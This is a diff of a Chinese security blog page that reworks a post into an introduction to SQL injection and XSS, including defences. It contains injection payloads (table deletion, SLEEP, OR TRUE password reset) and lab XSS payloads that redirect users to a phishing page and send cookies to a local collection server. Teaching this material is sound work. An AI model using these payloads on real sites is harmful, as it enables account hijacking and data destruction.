@@ -6,15 +6,15 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Web渗透——SQL注入简介, Alexation">
+    <meta name="keywords" content="Web安全, Alexation">
     <meta name="baidu-site-verification" content="fmlEuI34ir" />
     <meta name="google-site-verification" content="KeoTn_OFy4ndJwXNmm2gMeQfPhd7alqE9vQDwI32KCY" />
-    <meta name="description" content="渗透流程：
+    <meta name="description" content="SQL
+SQL简单介绍
 
-先学习前端编程（了解清楚对方的网站架构，才好判断该如何入手）
-信息搜集（作用：判断网站是否具备漏洞，判断具体漏洞存在的范围）
-绕waf（绕过对方的防火墙拦截，否则一切攻击手段会被拦截）
-漏洞攻击（漏洞类型有很多，针对不一样的漏">
+SQL 指结构化查询语言，全称是 Structured Query Language。
+SQL 让您可以访问和处理数据库，包括数据插入、查询、更新和删除。
+SQL 在1986年成为 ANSI（American Na">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -22,7 +22,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>Web渗透——SQL注入简介 | Alexation</title>
+    <title>Web安全 | Alexation</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -536,13 +536,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        Web渗透——SQL注入简介
+                        Web安全
                     </div>
                 </div>
             </div>
@@ -662,6 +662,10 @@
                                 <span class="chip bg-color">SQL</span>
                             </a>
                         
+                            <a href="/tags/XSS/" target="_blank">
+                                <span class="chip bg-color">XSS</span>
+                            </a>
+                        
                     </div>
                     
                 </div>
@@ -696,14 +700,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        441
+                        2.5k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        1 分
+                        9 分
                     </div>
                     
                 
@@ -720,15 +724,8 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h4 id="渗透流程：">渗透流程：</h4>
-<ol>
-<li>先学习前端编程（了解清楚对方的网站架构，才好判断该如何入手）</li>
-<li>信息搜集（作用：判断网站是否具备漏洞，判断具体漏洞存在的范围）</li>
-<li>绕waf（绕过对方的防火墙拦截，否则一切攻击手段会被拦截）</li>
-<li>漏洞攻击（漏洞类型有很多，针对不一样的漏洞有不一样的攻击方式，例如sql注入，xss，文件上传，反序列化）</li>
-<li>找到漏洞，进行提权</li>
-</ol>
-<h4 id="SQL是什么">SQL是什么</h4>
+                <div align="center"><h3>SQL</h3></div>
+<h4 id="SQL简单介绍">SQL简单介绍</h4>
 <ul>
 <li>SQL 指结构化查询语言，全称是 Structured Query Language。</li>
 <li>SQL 让您可以访问和处理数据库，包括数据插入、查询、更新和删除。</li>
@@ -739,16 +736,96 @@
 <li>sql注入的原理以及sqllite数据库</li>
 <li>sqlite的安装以及基本语句</li>
 <li>结合靶场理解sqlite的注入流程</li>
-<li>总结</li>
 </ol>
-<h4 id="sql注入简介">sql注入简介</h4>
+<h4 id="SQL注入简介">SQL注入简介</h4>
 <p>SQL注入是网站存在最多也是最简单的漏洞，主要原因是程序对用户输入的字符串没有进行过滤或处理不严谨。至今SQL注入仍然是首要的难以修复的安全漏洞。</p>
+<h4 id="SQL注入的原理">SQL注入的原理</h4>
+<p>SQL 注入的原理主要有以下 4 点：</p>
+<h5 id="1）恶意拼接查询">1）恶意拼接查询</h5>
+<p>我们知道，SQL 语句可以查询、插入、更新和删除数据，且使用分号来分隔不同的命令。例如：</p>
+<p><code>SELECT * FROM users WHERE user_id = $user_id</code></p>
+<p>其中，user_id 是传入的参数，如果传入的参数值为“1234; DELETE FROM users”，那么最终的查询语句会变为：</p>
+<p><code>SELECT * FROM users WHERE user_id = 1234; DELETE FROM users</code></p>
+<p>如果以上语句执行，则会删除 users 表中的所有数据。</p>
+<h5 id="2）利用注释执行非法命令。">2）利用注释执行非法命令。</h5>
+<p>SQL 语句中可以插入注释。例如：</p>
+<p><code>SELECT COUNT(*) AS 'num' FROM game_score WHERE game_id=24411 AND version=$version</code></p>
+<p>如果 version 包含了恶意的字符串<code>'-1' OR 3 AND SLEEP(500)--</code>，那么最终查询语句会变为：</p>
+<p><code>SELECT COUNT(*) AS 'num' FROM game_score WHERE game_id=24411 AND version='-1' OR 3 AND SLEEP(500)--</code></p>
+<p>以上恶意查询只是想耗尽系统资源，SLEEP(500) 将导致 SQL 语句一直运行。如果其中添加了修改、删除数据的恶意指令，那么将会造成更大的破坏。</p>
+<h5 id="3）传入非法参数">3）传入非法参数</h5>
+<p>SQL 语句中传入的字符串参数是用单引号引起来的，如果字符串本身包含单引号而没有被处理，那么可能会篡改原本 SQL 语句的作用。 例如：</p>
+<p><code>SELECT * FROM user_name WHERE user_name = $user_name</code></p>
+<p>如果 user_name 传入参数值为 G’chen，那么最终的查询语句会变为：</p>
+<p><code>SELECT * FROM user_name WHERE user_name ='G'chen'</code></p>
+<p>一般情况下，以上语句会执行出错，这样的语句风险比较小。虽然没有语法错误，但可能会恶意产生 SQL 语句，并且以一种你不期望的方式运行。</p>
+<h5 id="4）添加额外条件">4）添加额外条件</h5>
+<p>在 SQL 语句中添加一些额外条件，以此来改变执行行为。条件一般为真值表达式。例如：</p>
+<p><code>UPDATE users SET userpass='$userpass' WHERE user_id=$user_id;</code></p>
+<p>如果 user_id 被传入恶意的字符串“1234 OR TRUE”，那么最终的 SQL 语句会变为：</p>
+<p><code>UPDATE users SET userpass= '123456' WHERE user_id=1234 OR TRUE;</code></p>
+<p>这将更改所有用户的密码。</p>
+<h4 id="避免SQL注入">避免SQL注入</h4>
+<p>对于 SQL 注入，我们可以采取适当的预防措施来保护数据安全。下面是避免 SQL 注入的一些方法。</p>
+<h5 id="1-过滤输入内容，校验字符串">1. 过滤输入内容，校验字符串</h5>
+<p>过滤输入内容就是在数据提交到数据库之前，就把用户输入中的不合法字符剔除掉。可以使用编程语言提供的处理函数或自己的处理函数来进行过滤，还可以使用正则表达式匹配安全的字符串。</p>
+<p>如果值属于特定的类型或有具体的格式，那么在拼接 SQL 语句之前就要进行校验，验证其有效性。比如对于某个传入的值，如果可以确定是整型，则要判断它是否为整型，在浏览器端（客户端）和服务器端都需要进行验证。</p>
+<h5 id="2-参数化查询">2. 参数化查询</h5>
+<p>参数化查询目前被视作是预防 SQL 注入攻击最有效的方法。参数化查询是指在设计与数据库连接并访问数据时，在需要填入数值或数据的地方，使用参数（Parameter）来给值。</p>
+<p>MySQL 的参数格式是以“?”字符加上参数名称而成，如下所示：</p>
+<p><code>UPDATE myTable SET c1 = ?c1, c2 = ?c2, c3 = ?c3 WHERE c4 = ?c4</code></p>
+<p>在使用参数化查询的情况下，数据库服务器不会将参数的内容视为 SQL 语句的一部分来进行处理，而是在数据库完成 SQL 语句的编译之后，才套用参数运行。因此就算参数中含有破坏性的指令，也不会被数据库所运行。</p>
+<h5 id="3-安全测试、安全审计">3. 安全测试、安全审计</h5>
+<p>除了开发规范，还需要合适的工具来确保代码的安全。我们应该在开发过程中应对代码进行审查，在测试环节使用工具进行扫描，上线后定期扫描安全漏洞。通过多个环节的检查，一般是可以避免 SQL 注入的。</p>
+<p>有些人认为存储过程可以避免 SQL 注入，存储过程在传统行业里用得比较多，对于权限的控制是有一定用处的，但如果存储过程用到了动态查询，拼接 SQL，一样会存在安全隐患。</p>
+<h4 id="方法">方法</h4>
+<h5 id="1-避免使用动态SQL">1. 避免使用动态SQL</h5>
+<p>避免将用户的输入数据直接放入 SQL 语句中，最好使用准备好的语句和参数化查询，这样更安全。</p>
+<h5 id="2-不要将敏感数据保留在纯文本中">2. 不要将敏感数据保留在纯文本中</h5>
+<p>加密存储在数据库中的私有/机密数据，这样可以提供了另一级保护，以防攻击者成功地排出敏感数据。</p>
+<h5 id="3-限制数据库权限和特权">3. 限制数据库权限和特权</h5>
+<p>将数据库用户的功能设置为最低要求；这将限制攻击者在设法获取访问权限时可以执行的操作。</p>
+<h5 id="4-避免直接向用户显示数据库错误">4. 避免直接向用户显示数据库错误</h5>
+<p>攻击者可以使用这些错误消息来获取有关数据库的信息。</p>
+<p>一些编程框架对于写出更安全的代码也有一定的帮助，因为它提供了一些处理字符串的函数和使用查询参数的方法。但同样，你仍然可以编写出不安全的 SQL 语句。所以归根到底，我们需要有良好的编码规范，并能充分利用参数化查询、字符串处理和参数校验等多种办法来保护数据库和程序的安全。</p>
+<div align="center"><h3>XSS</h3></div>
+<h4 id="XSS的简单介绍">XSS的简单介绍</h4>
 <ul>
-<li>sql语言即是结构化查询语言，操作数据库的语言。</li>
-<li>注入在这里就是将用户输入的数据拼接到原始代码里，被当作代码执行。</li>
+<li>跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets,CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户目的。</li>
+<li>XSS危害：
+<ul>
+<li>流量劫持</li>
+<li>获取用户cookie信息，盗取账号</li>
+<li>篡改、删除页面信息（钓鱼）</li>
+<li>配合CSRF攻击，实施进一步攻击</li>
 </ul>
-<p>SQLite是一种开源， 零配置，独立的，事务关系数据库引擎。它是一个类似Access的轻量级数据库系统，但是更小、更快、容量更大，并发更高，在移动端经常会使用到。</p>
-<h4 id="待续…">待续…</h4>
+</li>
+<li>XSS分类
+<ul>
+<li>反射型XSS：反射型XSS也被称为非持久性XSS，当用户访问一个带有XSS代码的HTML请求时，服务器端接收数据后处理，然后把带有XSS的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，就造成XSS漏洞，这个过程就像一次反射，所以叫反射型XSS。</li>
+<li>存储型XSS：存储型XSS又被称为持久性XSS，存储型XSS是最危险的一种跨站脚本漏洞，当攻击者提交一段 XSS代码后，被服务端接收并存储，当攻击者或用户再次访问某个页面时，这段XSS代码被程序读出来响应给浏览器，造成XSS跨站攻击，这是存储型XSS。</li>
+<li>DOM型：不经过后端,DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞,dom - xss是通过url传入参数去控制触发的。</li>
+</ul>
+</li>
+</ul>
+<h4 id="一、钓鱼指向">一、钓鱼指向</h4>
+<p>在用户名框中输入<code>&lt;script&gt;alert(2)&lt;/script&gt;</code>(闭合input标签)，界面弹窗，证明该系统存在XSS注入。上一步验证得出，该页面存在XSS漏洞。接下来针对该漏洞进行修改链接属性实现跳转到钓鱼界面</p>
+<p>在username=后面加上<code>&lt;script&gt;document.getElementsByTagName(&quot;body&quot;)[0].onload=function changeLink()&#123;document.getElementById(&quot;myId&quot;).href='http://127.0.0.1:8082/wjmm.php';&#125;&lt;/script&gt;</code>（修改忘记密码a标签的href，使其指向钓鱼网站）收到cookie后，手动给浏览器添加对应cookie，实现伪造管理员（用户）登录</p>
+<h4 id="二、盗取Cookie">二、盗取Cookie</h4>
+<p>将js代码<code>&lt;/textarea&gt;'&quot;&gt;&lt;script src=http://127.0.0.1:8081/xss/cGMiSw?1555397544&gt;&lt;/script&gt;</code> 发表在文章管理系统的留言板上（该地址指向存放接收信息的服务器上的js路径）</p>
+<p>当后台管理员审核留言（或者其他用户查看到该留言）时，触发页面执行js脚本，将浏览器的cookie发送到接收服务器</p>
+<h4 id="XSS防范">XSS防范</h4>
+<ul>
+<li>XSS的威力主要是取决于JavaScript能够实现的程度，XSS跨站脚本的形成原因是对输入输出没有严格过滤，导致在页面上可以执行JavaScript等客户端代码，所以只要将敏感字符过滤，就可以修复XSS跨站漏洞。</li>
+<li>修复和防范方法：
+<ul>
+<li>三种类型的XSS漏洞都可以通过过滤或编码进行修复。</li>
+<li>反射型XSS和存储型XSS可以在服务端对用户输入输出的内容过滤和编码操作，将关键字进行过滤处理，关键符号进行编码处理，如将所有on事件,script等关键字进行过滤，将所有&lt;,&gt;,”,’,=等特殊符号进行实体化编码或url编码便可以修复。</li>
+<li>DOM型XSS如有在服务端进行交互，也可参考上述的方法进行修复，如未和服务端进行交互，可在客户端使用JavaScript等客户端脚本语言进行编码和过滤处理。</li>
+</ul>
+</li>
+</ul>
+<h3 id="待续…">待续…</h3>
 
             </div>
             <hr/>
@@ -899,7 +976,7 @@
                     </span>
                     <a href="https://www.alexation.cn" class="b-link-green">Alexation</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/webfront/Permeate/" class="b-link-green">Web渗透——SQL注入简介</a>
+                    <a href="/webfront/Permeate/" class="b-link-green">Web安全</a>
                 </p>
             </div>
 
@@ -1226,7 +1303,7 @@
                 <a href="/HelloWorld/">
                     <div class="card-image">
                         
-                        <img src="https://m2.im5i.com/2022/01/09/Uh5B3G.jpg" class="responsive-img" alt="Link Start！">
+                        <img src="/medias/banner/bilibili.jpg" class="responsive-img" alt="Link Start！">
                         
                         <span class="card-title">Link Start！</span>
                     </div>
@@ -1470,7 +1547,7 @@
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">32.2k</span> 字
+                <span class="white-color">35k</span> 字
             
 
             
